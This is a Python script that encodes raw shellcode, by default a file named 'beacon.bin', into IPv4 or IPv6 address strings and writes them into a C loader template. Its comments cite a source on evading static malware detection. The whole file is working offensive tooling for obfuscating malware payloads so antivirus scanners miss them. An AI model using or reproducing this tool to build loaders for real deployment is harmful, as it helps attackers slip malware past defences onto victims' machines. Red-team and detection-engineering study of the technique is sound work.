#!/usr/bin/env python3

import argparse
import sys
from ipaddress import ip_address
"""
Convert shellcode into IPv4 addresses
Based on: https://github.com/wsummerhill/IPv4Fuscation-Encrypted/blob/main/IPv4encrypt-shellcode.py
https://infosecwriteups.com/the-art-of-obfuscation-evading-static-malware-detection-f4663ae4716f
"""

def insert_ip(ips, template_name):
    with open(template_name) as template_file:
        template = template_file.read()
        template = template.replace('###IP###', ips)
        return template


def get_ips(ip_input, version):
    ip_string = ("const char* IPv{}s[] = ".format(version) + "{\n")

    if version == "4":
        ipsPerLine = 5
    else:
        ipsPerLine = 2
        
    for i in range(0, len(ip_input), ipsPerLine):
        ips_batch = ip_input[i:i + ipsPerLine]
        ip_string += '  ' + ', '.join(['"{}"'.format(ip) for ip in ips_batch]) + ',\n'

    ip_string = ip_string.rstrip(', \n') # Remove trailing comma and space
    ip_string += (" };")

    return ip_string


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", type=str,
                        help="File containing raw shellcode. Defaults to beacon.bin.")
    parser.add_argument("-v", "--version", type=str, help="IPv(4) or IPv(6).")
    
    if len(sys.argv) == 1:
        # No arguments received.  Print help and exit
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    if args.input:
        input_file = args.input
    else:
        input_file = "beacon.bin"

    if not args.version:
        args.version = "4"
    
    # Chunk size will depend on whether we are using IPv4 or IPv6
    if args.version == "6":
        chunk_size = 16
    else:
        chunk_size = 4

    # Read input shellcode file to get it in IPv4 format
    raw_ips = []
    with open(input_file, "rb") as f:
        chunk = f.read(chunk_size)
        while chunk:
            if len(chunk) < chunk_size: 
                padding = chunk_size - len(chunk)
                chunk = chunk + (b"\x90" * padding)
                raw_ips.append(str(ip_address(chunk)))
                break
            
            raw_ips.append(str(ip_address(chunk)))
            chunk = f.read(chunk_size)

    ips = get_ips(raw_ips, args.version)

    template_name = ''
    sourcecode_name = ''
    if args.version == "4":
        template_name = 'templates/bin2ipv4.c.template'
        sourcecode_name = 'bin2ipv4.c'
    else:
        template_name = 'templates/bin2ipv6.c.template'
        sourcecode_name = 'bin2ipv6.c'
        
    # Place our IPs in the template
    template = insert_ip(ips, template_name)

    # Write out the loader source code
    with open(sourcecode_name, 'w') as output_file:
        output_file.write(template)


if __name__ == '__main__':
    main()
